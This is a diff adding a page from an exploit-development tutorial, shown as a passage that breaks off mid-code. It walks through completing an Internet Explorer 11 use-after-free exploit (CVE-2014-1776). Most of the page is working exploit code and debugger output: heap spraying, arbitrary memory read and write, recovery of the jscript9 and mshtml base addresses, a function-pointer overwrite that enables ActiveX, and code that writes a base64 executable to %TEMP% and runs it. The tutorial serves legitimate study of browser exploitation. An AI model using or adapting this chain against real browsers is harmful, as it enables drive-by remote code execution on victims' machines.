@@ -1,0 +1,1074 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IE11: Part 2</title>
+    <link rel="stylesheet" href="styles.css">
+
+    <link rel="stylesheet" href="highlight/styles/stackoverflow-dark.min.css">
+    <script src="highlight/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+
+<div class="inner-content"><header class="page-header"><h1 class="page-title">IE11: Part 2</h1></header><div class="page-content"><h2>Completing the exploit</h2><p>As we saw, the <span style="color: #00ccff;">POC</span> uses <span style="color: #00ff00;">window.onload</span> because it requires that the javascript code is executed after the page has fully loaded. We must do the same in our exploit. We also need to make the required changes to the rest of the page. Here’s the resulting code:</p>
+
+<pre><code class="language-html">&lt;html xmlns:v="urn:schemas-microsoft-com:vml"&gt;
+&lt;head id="haed"&gt;
+&lt;title&gt;IE Case Study - STEP1&lt;/title&gt;
+&lt;style&gt;
+        v\:*{Behavior: url(#default#VML)}
+&lt;/style&gt;
+&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /&gt;
+&lt;script language="javascript"&gt;
+  window.onload = function() {
+    CollectGarbage();
+ 
+    var header_size = 0x20;
+    var array_len = (0x10000 - header_size)/4;
+    var a = new Array();
+    for (var i = 0; i &lt; 0x1000; ++i) {
+      a[i] = new Array(array_len);
+      a[i][0] = 0;
+    }
+    
+    magic_addr = 0xc000000;
+    
+    //           /------- allocation header -------\ /--------- buffer header ---------\
+    // 0c000000: 00000000 0000fff0 00000000 00000000 00000000 00000001 00003ff8 00000000
+    //                                                       array_len buf_len
+    
+    alert("Modify the \"Buffer length\" field of the Array at 0x" + magic_addr.toString(16));
+    
+    // Locate the modified Array.
+    var idx = -1;
+    for (var i = 0; i &lt; 0x1000 - 1; ++i) {
+      // We try to modify the first element of the next Array.
+      a[i][array_len + header_size/4] = 1;
+      
+      // If we successfully modified the first element of the next Array, then a[i]
+      // is the Array whose length we modified.
+      if (a[i+1][0] == 1) {
+        idx = i;
+        break;
+      }
+    }
+    
+    if (idx == -1) {
+      alert("Can't find the modified Array");
+      return;
+    }
+    
+    // Modify the second Array for reading/writing everywhere.
+    a[idx][array_len + 0x14/4] = 0x3fffffff;
+    a[idx][array_len + 0x18/4] = 0x3fffffff;
+    a[idx+1].length = 0x3fffffff;
+    var base_addr = magic_addr + 0x10000 + header_size;
+    
+    // Very Important:
+    //    The numbers in Array are signed int32. Numbers greater than 0x7fffffff are
+    //    converted to 64-bit floating point.
+    //    This means that we can't, for instance, write
+    //        a[idx+1][index] = 0xc1a0c1a0;
+    //    The number 0xc1a0c1a0 is too big to fit in a signed int32.
+    //    We'll need to represent 0xc1a0c1a0 as a negative integer:
+    //        a[idx+1][index] = -(0x100000000 - 0xc1a0c1a0);
+    
+    function int2uint(x) {
+      return (x &lt; 0) ? 0x100000000 + x : x;
+    }
+
+    function uint2int(x) {
+      return (x &gt;= 0x80000000) ? x - 0x100000000 : x;
+    }
+
+    // The value returned will be in [0, 0xffffffff].
+    function read(addr) {
+      var delta = addr - base_addr;
+      var val;
+      if (delta &gt;= 0)
+        val = a[idx+1][delta/4];
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        val = a[idx+1][(0x100000000 + delta)/4];
+      
+      return int2uint(val);
+    }
+    
+    // val must be in [0, 0xffffffff].
+    function write(addr, val) {
+      val = uint2int(val);
+      
+      var delta = addr - base_addr;
+      if (delta &gt;= 0)
+        a[idx+1][delta/4] = val;
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        a[idx+1][(0x100000000 + delta)/4] = val;
+    }
+    
+    function get_addr(obj) {
+      a[idx+2][0] = obj;
+      return read(base_addr + 0x10000);
+    }
+    
+    // Back to determining the base address of MSHTML...
+    // Here's the beginning of the element div:
+    //      +----- jscript9!Projection::ArrayObjectInstance::`vftable' = jscript9 + 0x2d50
+    //      v
+    //  04ab2d50 151f1ec0 00000000 00000000
+    //  6f5569ce 00000000 0085f5d8 00000000
+    //      ^
+    //      +---- MSHTML!CBaseTypeOperations::CBaseFinalizer = mshtml + 0x1569ce
+    var addr = get_addr(document.createElement("div"));
+    jscript9 = read(addr) - 0x2d50;
+    mshtml = read(addr + 0x10) - 0x1569ce;
+    
+    var old1 = read(mshtml+0xebcd98+0x10);
+    var old2 = read(mshtml+0xebcd98+0x14);
+
+    function GodModeOn() {
+      write(mshtml+0xebcd98+0x10, jscript9+0x155e19);
+      write(mshtml+0xebcd98+0x14, jscript9+0x155d7d);
+    }
+    
+    function GodModeOff() {
+      write(mshtml+0xebcd98+0x10, old1);
+      write(mshtml+0xebcd98+0x14, old2);
+    }
+
+    // content of exe file encoded in base64.
+    runcalc = 'TVqQAAMAAAAEAAAA//8AALgAAAAAA &lt;snipped&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+ 
+    function createExe(fname, data) {
+      GodModeOn();
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      GodModeOff();
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      
+      var bStream_addr = get_addr(bStream);
+      var string_addr = read(read(bStream_addr + 0x50) + 0x44);
+      write(string_addr, 0x003a0043);       // 'C:'
+      write(string_addr + 4, 0x0000005c);   // '\'
+      try {
+        bStream.SaveToFile(fname, 2);     // 2 = overwrites file if it already exists
+      }
+      catch(err) {
+        return 0;
+      }
+      
+      tStream.Close();
+      bStream.Close();
+      return 1;
+    }
+    
+    function decode(b64Data) {
+      var data = window.atob(b64Data);
+      
+       // Now data is like
+      //   11 00 12 00 45 00 50 00 ...
+      // rather than like
+      //   11 12 45 50 ...
+      // Let's fix this!
+      var arr = new Array();
+      for (var i = 0; i &lt; data.length / 2; ++i) {
+        var low = data.charCodeAt(i*2);
+        var high = data.charCodeAt(i*2 + 1);
+        arr.push(String.fromCharCode(low + high * 0x100));
+      }
+      return arr.join('');
+    }
+
+    GodModeOn();
+    var shell = new ActiveXObject("WScript.shell");
+    GodModeOff();
+    fname = shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe");
+    if (createExe(fname, decode(runcalc)) == 0) {
+//      alert("SaveToFile failed");
+      window.location.reload();
+      return 0;
+    }
+    shell.Exec(fname);
+ 
+    alert("Done");
+  }
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;&lt;v:group id="vml" style="width:500pt;"&gt;&lt;div&gt;&lt;/div&gt;&lt;/group&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>I snipped <span style="color: #00ff00;">runcalc</span>. You can download the full code from here: <a href="code/code6.zip">code6</a>.</p><p>When we try it, a familiar dialog box pops up:</p><p>
+<a href="images/pic_69.png"><img src="images/pic_69.png" alt="pic_69" width="470" height="181"></a>
+<br> This means that something changed and the <em>God Mode</em> doesn’t work anymore.</p><p>Let’s start by adding two alerts to check that the variables <span style="color: #00ff00;">jscript9</span> and <span style="color: #00ff00;">mshtml</span> contain the correct base addresses:</p>
+
+<pre><code class="language-js">    // Back to determining the base address of MSHTML...
+    // Here's the beginning of the element div:
+    //      +----- jscript9!Projection::ArrayObjectInstance::`vftable' = jscript9 + 0x2d50
+    //      v
+    //  04ab2d50 151f1ec0 00000000 00000000
+    //  6f5569ce 00000000 0085f5d8 00000000
+    //      ^
+    //      +---- MSHTML!CBaseTypeOperations::CBaseFinalizer = mshtml + 0x1569ce
+    var addr = get_addr(document.createElement("div"));
+    jscript9 = read(addr) - 0x2d50;
+    mshtml = read(addr + 0x10) - 0x1569ce;
+    alert(jscript9.toString(16));
+    alert(mshtml.toString(16));
+</code></pre>
+    
+    <p>When we reload the page in IE we discover that the two variables contain incorrect values. Let’s modify the code again to find out what’s wrong:</p>
+    
+<pre><code class="language-js">    // Back to determining the base address of MSHTML...
+    // Here's the beginning of the element div:
+    //      +----- jscript9!Projection::ArrayObjectInstance::`vftable' = jscript9 + 0x2d50
+    //      v
+    //  04ab2d50 151f1ec0 00000000 00000000
+    //  6f5569ce 00000000 0085f5d8 00000000
+    //      ^
+    //      +---- MSHTML!CBaseTypeOperations::CBaseFinalizer = mshtml + 0x1569ce
+    var addr = get_addr(document.createElement("div"));
+    alert(addr.toString(16));
+    jscript9 = read(addr) - 0x2d50;
+    mshtml = read(addr + 0x10) - 0x1569ce;
+</code></pre>
+    
+    <p>When we analyze the object at the address <span style="color: #00ff00;">addr</span>, we realize that something is missing:</p><pre class="ignore:true">0:021&gt; dd 3c600e0
+03c600e0  6cd75480 03c54120 00000000 03c6cfa0
+03c600f0  029648a0 03c6af44 03c6af74 00000000
+03c60100  6cd7898c 00000001 00000009 00000000
+03c60110  0654d770 00000000 00000000 00000000
+03c60120  6cd75480 03c54120 00000000 03c6c000
+03c60130  029648a0 03c6a3d4 03c6af44 00000000
+03c60140  6cd75480 03c54120 00000000 03c6cfb0
+03c60150  029648a0 029648c0 03c60194 00000000
+0:021&gt; ln 6cd75480
+(6cd75480)   jscript9!HostDispatch::`vftable'   |  (6cd755d8)   jscript9!Js::ConcatStringN&lt;4&gt;::`vftable'
+Exact matches:
+    jscript9!HostDispatch::`vftable' = &lt;no type information&gt;
+0:021&gt; ln 029648a0
+0:021&gt; dds 3c600e0
+03c600e0  6cd75480 jscript9!HostDispatch::`vftable'
+03c600e4  03c54120
+03c600e8  00000000
+03c600ec  03c6cfa0
+03c600f0  029648a0
+03c600f4  03c6af44
+03c600f8  03c6af74
+03c600fc  00000000
+03c60100  6cd7898c jscript9!HostVariant::`vftable'
+03c60104  00000001
+03c60108  00000009
+03c6010c  00000000
+03c60110  0654d770
+03c60114  00000000
+03c60118  00000000
+03c6011c  00000000
+03c60120  6cd75480 jscript9!HostDispatch::`vftable'
+03c60124  03c54120
+03c60128  00000000
+03c6012c  03c6c000
+03c60130  029648a0
+03c60134  03c6a3d4
+03c60138  03c6af44
+03c6013c  00000000
+03c60140  6cd75480 jscript9!HostDispatch::`vftable'
+03c60144  03c54120
+03c60148  00000000
+03c6014c  03c6cfb0
+03c60150  029648a0
+03c60154  029648c0
+03c60158  03c60194
+03c6015c  00000000</pre><p>How can we determine the base address of <span style="color: #00ff00;">mshtml.dll</span> without a pointer to a vftable in it?</p><p>We need to find another way. For now, we learned that the <span style="color: #00ff00;">div</span> element is represented by an object of type <span style="color: #00ff00;">jscript9!HostDispatch</span>. But we’ve already seen this object in action. Do you remember the stack trace of the crash? Here it is again:</p><pre class="ignore:true">0:007&gt; k 10
+ChildEBP RetAddr  
+0a53b790 0a7afc25 MSHTML!CMarkup::IsConnectedToPrimaryMarkup
+0a53b7d4 0aa05cc6 MSHTML!CMarkup::OnCssChange+0x7e
+0a53b7dc 0ada146f MSHTML!CElement::OnCssChange+0x28
+0a53b7f4 0a84de84 MSHTML!`CBackgroundInfo::Property&lt;CBackgroundImage&gt;'::`7'::`dynamic atexit destructor for 'fieldDefaultValue''+0x4a64
+0a53b860 0a84dedd MSHTML!SetNumberPropertyHelper&lt;long,CSetIntegerPropertyHelper&gt;+0x1d3
+0a53b880 0a929253 MSHTML!NUMPROPPARAMS::SetNumberProperty+0x20
+0a53b8a8 0ab8b117 MSHTML!CBase::put_BoolHelper+0x2a
+0a53b8c0 0ab8aade MSHTML!CBase::put_Bool+0x24
+0a53b8e8 0aa3136b MSHTML!GS_VARIANTBOOL+0xaa
+0a53b97c 0aa32ca7 MSHTML!CBase::ContextInvokeEx+0x2b6
+0a53b9a4 0a93b0cc MSHTML!CElement::ContextInvokeEx+0x4c
+0a53b9d0 0a8f8f49 MSHTML!CLinkElement::VersionedInvokeEx+0x49
+0a53ba08 6ef918eb MSHTML!CBase::PrivateInvokeEx+0x6d
+0a53ba6c 6f06abdc jscript9!HostDispatch::CallInvokeEx+0xae
+0a53bae0 6f06ab30 jscript9!HostDispatch::PutValueByDispId+0x94
+0a53baf8 6f06aafc jscript9!HostDispatch::PutValue+0x2a</pre><p>In particular, look at these two lines:</p><pre class="ignore:true ">0a53ba08 6ef918eb MSHTML!CBase::PrivateInvokeEx+0x6d
+0a53ba6c 6f06abdc jscript9!HostDispatch::CallInvokeEx+0xae</pre><p>It’s clear that <span style="color: #00ff00;">jscript9!HostDispatch::CallInvokeEx</span> knows the address of the function <span style="color: #00ff00;">MSHTML!CBase::PrivateInvokeEx</span> and if we’re lucky, this address is reachable from the object <span style="color: #00ff00;">HostDispatch</span> (remember that we know the address of an object of this very type).</p><p>Let’s examine <span style="color: #00ff00;">jscript9!HostDispatch::CallInvokeEx</span> in <span style="color: #00ccff;">IDA</span>. Load <span style="color: #00ff00;">jscript9</span> in IDA and then press <span style="color: #00ff00;">Ctrl+P</span> to locate <span style="color: #00ff00;">CallInvokeEx</span>. Now you can click on any instruction to see its offset relative to the current function. We want to locate the instruction at offset <span style="color: #00ff00;">0xae</span> of <span style="color: #00ff00;">CallInvokeEx</span>:</p><p>
+<a href="images/pic_70.png"><img src="images/pic_70.png" alt="pic_70" width="1387" height="688"></a>
+<br> It looks like the address of <span style="color: #00ff00;">MSHTML!CBase::PrivateInvokeEx</span> is at the address <span style="color: #00ff00;">eax+20h</span>.</p><p>As we did with the UAF bugs, we’ll try to determine where the address of <span style="color: #00ff00;">MSHTML!CBase::PrivateInvokeEx</span> comes from:</p><p>
+<a href="images/pic_71.png"><img src="images/pic_71.png" alt="pic_71" width="1354" height="2241"></a>
+<br> Now we’ll need to examine the function <span style="color: #00ff00;">GetHostVariantWrapper</span>:</p><p>
+<a href="images/pic_72.png"><img src="images/pic_72.png" alt="pic_72" width="1319" height="760"></a>
+<br> By merging the schemata, we get the following:</p><pre class="ignore:true">X = [this+0ch]
+var_14 = [X+8]
+X = var_14
+obj_ptr = [X+10h]</pre><p>More simply:</p><pre class="ignore:true">X = [this+0ch]
+X = [X+8]
+obj_ptr = [X+10h]</pre><p>Let’s see if we’re right. Let’s reload the html page in IE and examine the <span style="color: #00ff00;">div</span> element again:</p><pre class="ignore:true">0:022&gt; dd 5360f20
+05360f20  6cc55480 05354280 00000000 0536cfb0
+05360f30  0419adb0 0536af74 0536afa4 00000000
+05360f40  6cc5898c 00000001 00000009 00000000
+05360f50  00525428 00000000 00000000 00000000
+05360f60  05360f81 00000000 00000000 00000000
+05360f70  00000000 00000000 00000000 00000000
+05360f80  05360fa1 00000000 00000000 00000000
+05360f90  00000000 00000000 00000000 00000000
+0:022&gt; ln 6cc55480
+(6cc55480)   jscript9!HostDispatch::`vftable'   |  (6cc555d8)   jscript9!Js::ConcatStringN&lt;4&gt;::`vftable'
+Exact matches:
+    jscript9!HostDispatch::`vftable' = &lt;no type information&gt;
+0:022&gt; dd poi(5360f20+c)
+0536cfb0  6cc52d44 00000001 05360f00 00000000
+0536cfc0  6cc52d44 00000001 05360f40 00000000
+0536cfd0  0536cfe1 00000000 00000000 00000000
+0536cfe0  0536cff1 00000000 00000000 00000000
+0536cff0  0536cf71 00000000 00000000 00000000
+0536d000  6cc54534 0535d8c0 00000000 00000005
+0536d010  00004001 047f0010 053578c0 00000000
+0536d020  00000001 05338760 00000000 00000000
+0:022&gt; ln 6cc52d44
+(6cc52d44)   jscript9!DummyVTableObject::`vftable'   |  (6cc52d50)   jscript9!Projection::ArrayObjectInstance::`vftable'
+Exact matches:
+    jscript9!Projection::UnknownEventHandlingThis::`vftable' = &lt;no type information&gt;
+    jscript9!Js::FunctionInfo::`vftable' = &lt;no type information&gt;
+    jscript9!Projection::UnknownThis::`vftable' = &lt;no type information&gt;
+    jscript9!Projection::NamespaceThis::`vftable' = &lt;no type information&gt;
+    jscript9!Js::WinRTFunctionInfo::`vftable' = &lt;no type information&gt;
+    jscript9!RefCountedHostVariant::`vftable' = &lt;no type information&gt;
+    jscript9!DummyVTableObject::`vftable' = &lt;no type information&gt;
+    jscript9!Js::FunctionProxy::`vftable' = &lt;no type information&gt;
+0:022&gt; dd poi(poi(5360f20+c)+8)
+05360f00  6cc5898c 00000005 00000009 00000000
+05360f10  00565d88 00000000 00000000 00000000
+05360f20  6cc55480 05354280 00000000 0536cfb0
+05360f30  0419adb0 0536af74 0536afa4 00000000
+05360f40  6cc5898c 00000001 00000009 00000000
+05360f50  00525428 00000000 00000000 00000000
+05360f60  05360f81 00000000 00000000 00000000
+05360f70  00000000 00000000 00000000 00000000
+0:022&gt; ln 6cc5898c
+(6cc5898c)   jscript9!HostVariant::`vftable'   |  (6cc589b5)   jscript9!Js::CustomExternalObject::SetProperty
+Exact matches:
+    jscript9!HostVariant::`vftable' = &lt;no type information&gt;
+0:022&gt; dd poi(poi(poi(5360f20+c)+8)+10)
+00565d88  6f03eb04 00000001 00000000 00000008
+00565d98  00000000 05360f08 00000000 00000000
+00565da8  00000022 02000400 00000000 00000000
+00565db8  07d47798 07d47798 5c0cccc8 88000000
+00565dc8  003a0043 0057005c 006e0069 006f0064
+00565dd8  00730077 0073005c 00730079 00650074
+00565de8  0033006d 005c0032 00580053 002e0053
+00565df8  004c0044 0000004c 5c0cccb0 88000000
+0:022&gt; ln 6f03eb04
+(6f03eb04)   MSHTML!CDivElement::`vftable'   |  (6ede7f24)   MSHTML!s_propdescCDivElementnofocusrect
+Exact matches:
+    MSHTML!CDivElement::`vftable' = &lt;no type information&gt;</pre><p>Bingo! Our problems are solved! Now let’s compute the <span style="color: #00ccff;">RVA</span> of the vftable just found:</p><pre class="ignore:true">0:005&gt; ? 6f03eb04-mshtml
+Evaluate expression: 3861252 = 003aeb04</pre><p>We also need to compute the RVA for <span style="color: #00ff00;">jscript9!HostDispatch::`vftable’</span>:</p><pre class="ignore:true">0:005&gt; ? 6cc55480-jscript9
+Evaluate expression: 21632 = 00005480</pre><p>Now change the code as follows:</p>
+
+<pre><code class="language-js">    // Here's the beginning of the element div:
+    //      +----- jscript9!HostDispatch::`vftable' = jscript9 + 0x5480
+    //      v
+    //  6cc55480 05354280 00000000 0536cfb0
+    //
+    // To find the vftable MSHTML!CDivElement::`vftable', we must follow a chain of pointers:
+    //   X = [div_elem+0ch]
+    //   X = [X+8]
+    //   obj_ptr = [X+10h]
+    //   vftptr = [obj_ptr]
+    // where vftptr = vftable MSHTML!CDivElement::`vftable' = mshtml + 0x3aeb04.
+    var addr = get_addr(document.createElement("div"));
+    jscript9 = read(addr) - 0x5480;
+    mshtml = read(read(read(read(addr + 0xc) + 8) + 0x10)) - 0x3aeb04;
+    alert(jscript9.toString(16));
+    alert(mshtml.toString(16));
+    return;
+</code></pre>
+    
+    <p>Try it out: is should work just fine!</p><p>Now remove the two alerts and the return. Mmm… the calculator doesn’t appear, so there must be something wrong (again!). To see what’s wrong, we can rely on the <span style="color: #00ccff;">Developer Tools</span>. It seems that when the Developer Tools are enabled our <em>God Mode</em> doesn’t work. Just authorize the execution of the <span style="color: #00ff00;">ActiveXObject</span> and you should see the following error:</p><p>
+<a href="images/pic_73.png"><img src="images/pic_73.png" alt="pic_73" width="1262" height="793"></a>
+    <br> Luckily, the problem is quite simple: <span style="color: #00ff00;">atob</span> isn’t available in <span style="color: #00ccff;">IE 9</span>. I found a <span style="color: #00ccff;">polyfill</span> for atob here:</p><p style="padding-left: 30px;"><a href="https://github.com/Modernizr/Modernizr/wiki/HTML5-Cross-Browser-Polyfills#base64-windowatob-and-windowbtoa">https://github.com/Modernizr/Modernizr/wiki/HTML5-Cross-Browser-Polyfills#base64-windowatob-and-windowbtoa</a></p><p>Here’s the modified code:</p>
+    
+<pre><code class="language-html">&lt;html xmlns:v="urn:schemas-microsoft-com:vml"&gt;
+&lt;head id="haed"&gt;
+&lt;title&gt;IE Case Study - STEP1&lt;/title&gt;
+&lt;style&gt;
+        v\:*{Behavior: url(#default#VML)}
+&lt;/style&gt;
+&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /&gt;
+&lt;script language="javascript"&gt;
+  window.onload = function() {
+    CollectGarbage();
+ 
+    var header_size = 0x20;
+    var array_len = (0x10000 - header_size)/4;
+    var a = new Array();
+    for (var i = 0; i &lt; 0x1000; ++i) {
+      a[i] = new Array(array_len);
+      a[i][0] = 0;
+    }
+    
+    magic_addr = 0xc000000;
+    
+    //           /------- allocation header -------\ /--------- buffer header ---------\
+    // 0c000000: 00000000 0000fff0 00000000 00000000 00000000 00000001 00003ff8 00000000
+    //                                                       array_len buf_len
+    
+    alert("Modify the \"Buffer length\" field of the Array at 0x" + magic_addr.toString(16));
+    
+    // Locate the modified Array.
+    var idx = -1;
+    for (var i = 0; i &lt; 0x1000 - 1; ++i) {
+      // We try to modify the first element of the next Array.
+      a[i][array_len + header_size/4] = 1;
+      
+      // If we successfully modified the first element of the next Array, then a[i]
+      // is the Array whose length we modified.
+      if (a[i+1][0] == 1) {
+        idx = i;
+        break;
+      }
+    }
+    
+    if (idx == -1) {
+      alert("Can't find the modified Array");
+      return;
+    }
+    
+    // Modify the second Array for reading/writing everywhere.
+    a[idx][array_len + 0x14/4] = 0x3fffffff;
+    a[idx][array_len + 0x18/4] = 0x3fffffff;
+    a[idx+1].length = 0x3fffffff;
+    var base_addr = magic_addr + 0x10000 + header_size;
+    
+    // Very Important:
+    //    The numbers in Array are signed int32. Numbers greater than 0x7fffffff are
+    //    converted to 64-bit floating point.
+    //    This means that we can't, for instance, write
+    //        a[idx+1][index] = 0xc1a0c1a0;
+    //    The number 0xc1a0c1a0 is too big to fit in a signed int32.
+    //    We'll need to represent 0xc1a0c1a0 as a negative integer:
+    //        a[idx+1][index] = -(0x100000000 - 0xc1a0c1a0);
+    
+    function int2uint(x) {
+      return (x &lt; 0) ? 0x100000000 + x : x;
+    }
+
+    function uint2int(x) {
+      return (x &gt;= 0x80000000) ? x - 0x100000000 : x;
+    }
+
+    // The value returned will be in [0, 0xffffffff].
+    function read(addr) {
+      var delta = addr - base_addr;
+      var val;
+      if (delta &gt;= 0)
+        val = a[idx+1][delta/4];
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        val = a[idx+1][(0x100000000 + delta)/4];
+      
+      return int2uint(val);
+    }
+    
+    // val must be in [0, 0xffffffff].
+    function write(addr, val) {
+      val = uint2int(val);
+      
+      var delta = addr - base_addr;
+      if (delta &gt;= 0)
+        a[idx+1][delta/4] = val;
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        a[idx+1][(0x100000000 + delta)/4] = val;
+    }
+    
+    function get_addr(obj) {
+      a[idx+2][0] = obj;
+      return read(base_addr + 0x10000);
+    }
+    
+    // Here's the beginning of the element div:
+    //      +----- jscript9!HostDispatch::`vftable' = jscript9 + 0x5480
+    //      v
+    //  6cc55480 05354280 00000000 0536cfb0
+    //
+    // To find the vftable MSHTML!CDivElement::`vftable', we must follow a chain of pointers:
+    //   X = [div_elem+0ch]
+    //   X = [X+8]
+    //   obj_ptr = [X+10h]
+    //   vftptr = [obj_ptr]
+    // where vftptr = vftable MSHTML!CDivElement::`vftable' = mshtml + 0x3aeb04.
+    var addr = get_addr(document.createElement("div"));
+    jscript9 = read(addr) - 0x5480;
+    mshtml = read(read(read(read(addr + 0xc) + 8) + 0x10)) - 0x3aeb04;
+
+    var old1 = read(mshtml+0xebcd98+0x10);
+    var old2 = read(mshtml+0xebcd98+0x14);
+
+    function GodModeOn() {
+      write(mshtml+0xebcd98+0x10, jscript9+0x155e19);
+      write(mshtml+0xebcd98+0x14, jscript9+0x155d7d);
+    }
+    
+    function GodModeOff() {
+      write(mshtml+0xebcd98+0x10, old1);
+      write(mshtml+0xebcd98+0x14, old2);
+    }
+
+    // content of exe file encoded in base64.
+    runcalc = 'TVqQAAMAAAAEAAAA//8AALgAAAAAA &lt;snipped&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+ 
+    function createExe(fname, data) {
+      GodModeOn();
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      GodModeOff();
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      
+      var bStream_addr = get_addr(bStream);
+      var string_addr = read(read(bStream_addr + 0x50) + 0x44);
+      write(string_addr, 0x003a0043);       // 'C:'
+      write(string_addr + 4, 0x0000005c);   // '\'
+      try {
+        bStream.SaveToFile(fname, 2);     // 2 = overwrites file if it already exists
+      }
+      catch(err) {
+        return 0;
+      }
+      
+      tStream.Close();
+      bStream.Close();
+      return 1;
+    }
+
+    // decoder
+    // [https://gist.github.com/1020396] by [https://github.com/atk]
+    function atob(input) {
+      var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+      var str = String(input).replace(/=+$/, '');
+      if (str.length % 4 == 1) {
+        throw new InvalidCharacterError("'atob' failed: The string to be decoded is not correctly encoded.");
+      }
+      for (
+        // initialize result and counters
+        var bc = 0, bs, buffer, idx = 0, output = '';
+        // get next character
+        buffer = str.charAt(idx++);
+        // character found in table? initialize bit storage and add its ascii value;
+        ~buffer &amp;&amp; (bs = bc % 4 ? bs * 64 + buffer : buffer,
+          // and if not first of each 4 characters,
+          // convert the first 8 bits to one ascii character
+          bc++ % 4) ? output += String.fromCharCode(255 &amp; bs &gt;&gt; (-2 * bc &amp; 6)) : 0
+      ) {
+        // try to find character in table (0-63, not found =&gt; -1)
+        buffer = chars.indexOf(buffer);
+      }
+      return output;
+    }
+
+    function decode(b64Data) {
+      var data = atob(b64Data);
+      
+       // Now data is like
+      //   11 00 12 00 45 00 50 00 ...
+      // rather than like
+      //   11 12 45 50 ...
+      // Let's fix this!
+      var arr = new Array();
+      for (var i = 0; i &lt; data.length / 2; ++i) {
+        var low = data.charCodeAt(i*2);
+        var high = data.charCodeAt(i*2 + 1);
+        arr.push(String.fromCharCode(low + high * 0x100));
+      }
+      return arr.join('');
+    }
+
+    GodModeOn();
+    var shell = new ActiveXObject("WScript.shell");
+    GodModeOff();
+    fname = shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe");
+    if (createExe(fname, decode(runcalc)) == 0) {
+      alert("SaveToFile failed");
+      window.location.reload();
+      return 0;
+    }
+    shell.Exec(fname);
+ 
+    alert("Done");
+  }
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;&lt;v:group id="vml" style="width:500pt;"&gt;&lt;div&gt;&lt;/div&gt;&lt;/group&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>As before, I snipped <span style="color: #00ff00;">runcalc</span>. You can download the full code from here: <a href="code/code7.zip">code7</a>.</p><p>Now the calculator pops up and everything seems to work fine until we get a crash. The crash doesn’t always happen but there’s definitely something wrong with the code. A crash is probably caused by an incorrect write. Since the <em>God Mode</em> works correctly, the problem must be with the two writes right before the call to <span style="color: #00ff00;">bStream.SaveToFile</span>.</p><p>Let’s comment out the two writes and try again. Perfect! Now there are no more crashes! But we can’t just leave out the two writes. If we use <span style="color: #00ccff;">SimpleServer</span>, it doesn’t work of course because the two writes are needed. Maybe surprisingly, if we add back the two writes, everything works just fine.</p><p>If we investigate things a bit, we discover that when the html page is loaded in IE directly from the hard disk, <span style="color: #00ff00;">string_addr</span> points to a null dword. On the other hand, when the page is loaded by going to <span style="color: #00ff00;">127.0.0.1</span> and is served by SimpleServer, <span style="color: #00ff00;">string_addr</span> points to the <span style="color: #00ccff;">Unicode</span> string <span style="color: #00ff00;">http://127.0.0.1/</span>. For this reason, we should change the code as follows:</p>
+
+<pre><code class="language-js">      var bStream_addr = get_addr(bStream);
+      var string_addr = read(read(bStream_addr + 0x50) + 0x44);
+      if (read(string_addr) != 0) {         // only when there is a string to overwrite
+        write(string_addr, 0x003a0043);       // 'C:'
+        write(string_addr + 4, 0x0000005c);   // '\'
+      }
+      try {
+        bStream.SaveToFile(fname, 2);     // 2 = overwrites file if it already exists
+      }
+      catch(err) {
+        return 0;
+      }
+</code></pre>
+      
+      <p></p><h2>Completing the exploit (2)</h2><p>It’s high time we completed this exploit! Here’s the full code:</p>
+      
+<pre><code class="language-html">&lt;html xmlns:v="urn:schemas-microsoft-com:vml"&gt;
+&lt;head id="haed"&gt;
+&lt;title&gt;IE Case Study - STEP1&lt;/title&gt;
+&lt;style&gt;
+        v\:*{Behavior: url(#default#VML)}
+&lt;/style&gt;
+&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /&gt;
+&lt;script language="javascript"&gt;
+  magic_addr = 0xc000000;
+
+  function dword2Str(dword) {
+    var low = dword % 0x10000;
+    var high = Math.floor(dword / 0x10000);
+    if (low == 0 || high == 0)
+      alert("dword2Str: null wchars not allowed");
+    return String.fromCharCode(low, high);
+  }
+ 
+  function getPattern(offset_values, tot_bytes) {
+    if (tot_bytes % 4 != 0)
+      alert("getPattern(): tot_bytes is not a multiple of 4");
+    var pieces = new Array();
+    var pos = 0;
+    for (i = 0; i &lt; offset_values.length/2; ++i) {
+      var offset = offset_values[i*2];
+      var value = offset_values[i*2 + 1];
+      var padding = new Array((offset - pos)/2 + 1).join("a");
+      pieces.push(padding + dword2Str(value));
+      pos = offset + 4;
+    }
+    // The "- 2" accounts for the null wchar at the end of the string.
+    var padding = new Array((tot_bytes - 2 - pos)/2 + 1).join("a");
+    pieces.push(padding);
+    return pieces.join("");
+  }
+
+  function trigger() {
+    var head = document.getElementById("haed")
+    tmp = document.createElement("CVE-2014-1776")
+    document.getElementById("vml").childNodes[0].appendChild(tmp)
+    tmp.appendChild(head)
+    tmp = head.offsetParent
+    tmp.onpropertychange = function(){
